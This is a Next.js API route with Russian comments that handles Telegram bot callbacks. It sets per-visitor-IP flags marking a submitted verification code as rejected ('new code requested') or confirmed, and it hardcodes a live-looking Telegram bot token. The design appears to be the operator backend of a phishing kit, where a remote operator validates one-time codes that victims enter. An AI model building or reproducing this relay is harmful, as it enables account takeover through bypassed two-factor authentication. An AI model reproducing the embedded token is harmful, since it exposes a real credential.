import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag, setCodeSuccessFlag } from '../codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';

export async function POST(req: NextRequest) {
  try {
    console.log('Callback endpoint hit');
    const body = await req.json();
    console.log('Callback received body:', JSON.stringify(body, null, 2));

    if (!body.callback_query) {
      console.log('No callback_query in body');
      return NextResponse.json({ ok: false, error: 'No callback_query' }, { status: 400 });
    }

    // Получаем IP из сообщения
    const messageText = body.callback_query.message.text;
    console.log('Message text:', messageText);
    
    // Изменяем регулярку для более точного поиска IP
    const ipMatch = messageText.match(/🌍 <b>IP:<\/b> ([^\n]+)/);
    const ip = ipMatch ? ipMatch[1].trim() : 'localhost';
    console.log('Extracted IP:', ip);
    console.log('Callback data:', body.callback_query.data);

    if (body.callback_query.data === 'code_error') {
      console.log('Processing code_error callback');
      // Устанавливаем флаг ошибки
      setCodeErrorFlag(ip, true);
      console.log('Set code error flag for IP:', ip);
      
      // Отправляем ответ в Telegram
      const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
      console.log('Sending answer to Telegram:', answerUrl);
      const response = await fetch(answerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: 'Запрошен новый код'
        })
      });

      const responseData = await response.json();
      console.log('Telegram answer response:', responseData);

      if (!response.ok) {
        console.error('Failed to send answer to Telegram:', responseData);
        return NextResponse.json({ ok: false, error: 'Failed to send answer to Telegram' }, { status: 500 });
      }
    } else if (body.callback_query.data === 'code_success') {
      console.log('Processing code_success callback');
      // Устанавливаем флаг успеха
      setCodeSuccessFlag(ip, true);
      console.log('Set code success flag for IP:', ip);
      
      // Отправляем ответ в Telegram
      const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
      console.log('Sending answer to Telegram:', answerUrl);
      const response = await fetch(answerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: 'Код подтвержден'
        })
      });

      const responseData = await response.json();
      console.log('Telegram answer response:', responseData);

      if (!response.ok) {
        console.error('Failed to send answer to Telegram:', responseData);
        return NextResponse.json({ ok: false, error: 'Failed to send answer to Telegram' }, { status: 500 });
      }
    } else {
      console.log('Unknown callback data:', body.callback_query.data);
    }
    
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error processing callback:', error);
    return NextResponse.json({ ok: false, error: 'Internal server error' }, { status: 500 });
  }
} 